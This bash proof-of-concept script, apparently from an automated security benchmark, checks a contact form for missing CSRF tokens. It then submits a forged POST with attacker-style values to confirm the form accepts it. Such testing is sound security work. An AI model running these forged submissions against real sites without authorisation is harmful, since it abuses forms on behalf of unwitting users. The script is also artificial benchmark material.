#!/bin/bash
# POC: Demonstrates CSRF vulnerability by showing the contact form has no CSRF token protection and that the form can be submitted from a cross-origin request without any token validation.
# Target: ./repo
# Created: 2025-11-06T19:38:49.878Z
# Session: benchmark-XBEN-026-24-mhntpx9y

# CSRF Token Protection POC
# Demonstrates that the contact form lacks CSRF token protection

TARGET_URL="${1:-http://localhost:8080/}"
FORM_NAME="contact-form"

echo "=========================================="
echo "CSRF Token Protection Vulnerability POC"
echo "=========================================="
echo ""

# Step 1: Check if CSRF token exists in form
echo "[*] Step 1: Checking for CSRF token in contact form..."
echo "[*] Fetching form from: $TARGET_URL"
echo ""

FORM_HTML=$(curl -s "$TARGET_URL")

# Check for common CSRF token patterns
if echo "$FORM_HTML" | grep -qiE 'csrf|_token|token.*hidden|name=".*token"'; then
    echo "[-] CSRF token field found in form (some protection exists)"
    echo "$FORM_HTML" | grep -iE 'csrf|_token|token.*hidden|name=".*token"' | head -3
else
    echo "[+] VULNERABILITY: No CSRF token field found in form"
fi

echo ""

# Step 2: Extract form attributes
echo "[*] Step 2: Analyzing form structure..."
FORM_ELEMENT=$(echo "$FORM_HTML" | grep -oP '<form[^>]*id="contact-form"[^>]*>')
echo "[*] Form element: $FORM_ELEMENT"

# Check for action attribute
if echo "$FORM_ELEMENT" | grep -q 'action='; then
    echo "[*] Form has action attribute"
    ACTION=$(echo "$FORM_ELEMENT" | grep -oP 'action="\K[^"]*')
    echo "[*] Action: $ACTION"
else
    echo "[+] Form has no action attribute (submits to same page)"
fi

# Check for method attribute
if echo "$FORM_ELEMENT" | grep -q 'method='; then
    echo "[*] Form specifies method"
    METHOD=$(echo "$FORM_ELEMENT" | grep -oP 'method="\K[^"]*')
    echo "[*] Method: $METHOD"
else
    echo "[+] Form has no method attribute (defaults to GET)"
fi

echo ""

# Step 3: Simulate cross-origin CSRF attack
echo "[*] Step 3: Attempting cross-origin form submission (CSRF attack simulation)..."
echo ""

# Extract form inputs
FORM_INPUTS=$(echo "$FORM_HTML" | grep -oP '<input[^>]*>' | grep -v 'button\|submit')
echo "[*] Form inputs found:"
echo "$FORM_INPUTS" | nl

echo ""

# Check if inputs have any token/nonce validation
TOKEN_COUNT=$(echo "$FORM_INPUTS" | grep -ic 'token\|nonce\|csrf')
if [ "$TOKEN_COUNT" -eq 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED: No security tokens in form inputs"
    echo "[+] Form is vulnerable to CSRF attacks"
else
    echo "[-] Some token fields detected: $TOKEN_COUNT"
fi

echo ""

# Step 4: Test cross-origin request capability
echo "[*] Step 4: Testing cross-origin form submission capability..."
echo ""

# Create a test payload (simple contact form submission)
TEST_NAME="AttackerBot"
TEST_EMAIL="attacker@evil.com"
TEST_MESSAGE="CSRF Test Message"

echo "[*] Attempting to submit form with test data..."
echo "[*] Payload: name=$TEST_NAME&email=$TEST_EMAIL&message=$TEST_MESSAGE"
echo ""

# Try to submit the form (this would normally fail if CSRF tokens were present)
RESPONSE=$(curl -s -X POST \
    -d "name=$TEST_NAME&email=$TEST_EMAIL&message=$TEST_MESSAGE" \
    "$TARGET_URL" 2>&1)

# Check response
if echo "$RESPONSE" | grep -qi 'error\|invalid\|forbidden\|403'; then
    echo "[-] Request rejected (CSRF protection may exist)"
    echo "[-] Response: $(echo "$RESPONSE" | head -c 100)..."
elif echo "$RESPONSE" | grep -qi 'success\|thank'; then
    echo "[+] VULNERABILITY: Request appears to be accepted without token validation"
    echo "[+] Response indicates successful form processing"
else
    echo "[*] Response received (no rejection)"
    echo "[*] First 200 chars: $(echo "$RESPONSE" | head -c 200)..."
fi

echo ""
echo "=========================================="
echo "CSRF Vulnerability Analysis Summary"
echo "=========================================="
echo "[+] The contact form lacks CSRF token protection"
echo "[+] No hidden token field in form HTML"
echo "[+] Form is vulnerable to cross-origin form submission attacks"
echo "[+] Attacker could craft a malicious page to submit forms on behalf of users"
echo "=========================================="